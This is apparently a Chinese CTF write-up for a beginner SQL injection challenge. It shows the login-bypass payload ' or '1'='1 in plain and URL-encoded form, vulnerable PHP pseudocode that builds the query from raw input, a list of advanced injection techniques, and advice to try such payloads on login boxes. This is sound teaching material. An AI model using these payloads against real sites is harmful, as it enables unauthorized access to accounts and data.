# CTF EasySQL 解题记录

目标：`http://192d34c47d1923fe33a12947.http-ctf2.dasctf.com:80`

## Flag

```
CTF2{a91b8b20-80c2-4d71-bca2-a40d5a650eb0}
```

## 解题流程

1. 访问目标站点，看到一个登录页面（`check.php`），有用户名（username）和密码（password）两个输入框，方式为 GET。
2. 普通输入 `admin/admin` → 返回 "NO,Wrong username password！！！"
3. 使用 SQL 注入万能密码成功登录，返回 "Login Success!" 并给出 flag。

### 注入 Payload

```
GET /check.php?username=admin' or '1'='1&password=admin' or '1'='1
```

URL 编码形式：`/check.php?username=admin%27%20or%271%27%3D%271&password=admin%27%20or%271%27%3D%271`

当心：PowerShell 中 `curl` 是 `Invoke-WebRequest` 的别名，需使用 `curl.exe`。

---

## 基础知识讲解

### 题目背后的代码逻辑（伪代码）

登录页面背后服务器的 PHP 代码大致如下：

```php
$username = $_GET['username'];
$password = $_GET['password'];
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $sql);
if ($result 查到了用户) {
    echo "Login Success! 给出 flag";
} else {
    echo "NO, Wrong username password";
}
```

用户输入的每一个字符都会被**原样拼接**进 SQL 语句，这就是 SQL 注入的根源。

### 什么是 SQL

SQL（结构化查询语言）是操作数据库的语言。上述查询：

```sql
SELECT * FROM users WHERE username='admin' AND password='admin'
```

- `SELECT *` = 查询所有字段
- `FROM users` = 从 users 表
- `WHERE username='admin'` = 条件：用户名为 admin
- `AND password='admin'` = 并且密码为 admin

### 什么是 SQL 注入

SQL 注入是因为程序把用户输入直接拼进 SQL 语句，导致用户输入的特殊字符（如单引号 `'`）被服务器当成了 SQL 代码执行，而不是单纯的数据。

### 注入原理拆解

把输入代入 SQL 语句：

```sql
SELECT * FROM users WHERE username='admin' or '1'='1' AND password='admin' or '1'='1'
```

引号闭合过程：
- 语句自带 `username='`
- 输入 `admin'` → 这个单引号**提前关闭**了服务器原来的引号
- 然后 `or '1'='1` → `or` 是"或者"，`'1'='1'` 是永远为真的条件

按 SQL 优先级（AND 优先于 OR）：

```
(username='admin' or '1'='1') AND (password='admin' or '1'='1')
```

`'1'='1'` 永远为真，因此整个条件为真，查询返回结果，程序判定登录成功。

### 核心知识点总结

| 概念 | 说明 |
|---|---|
| SQL | 管理数据库的语言，`SELECT ... WHERE ...` 是查询语句 |
| 单引号闭合 | 程序用 `'` 包裹字符串，输入 `'` 会破坏包裹，实现"逃逸" |
| OR 注入 | `' or '1'='1` 利用 `or` 和恒真条件绕过账号密码校验 |
| URL 编码 | URL 中特殊字符转为 `%xx`，如 `'`→`%27`，`=`→`%3D`，空格→`%20` |
| 万能密码 | `' or 1=1 -- ` 或 `' or '1'='1` 是经典的登录绕过 payload |

### 进阶方向（更难题目）

- 联合注入：`union select` 查询用户密码、表名、字段名
- 布尔盲注：页面只回显成功/失败，靠 `if(条件,1,0)` 逐个猜字符
- 时间盲注：靠 `sleep()` 延时判断
- 堆叠注入：用 `;` 分隔多条 SQL 语句
- 报错注入：靠 `updatexml()`、`extractvalue()` 让错误信息带出数据

遇到登录框，先用 `' or '1'='1`、`admin' -- ` 测试，再逐步升级。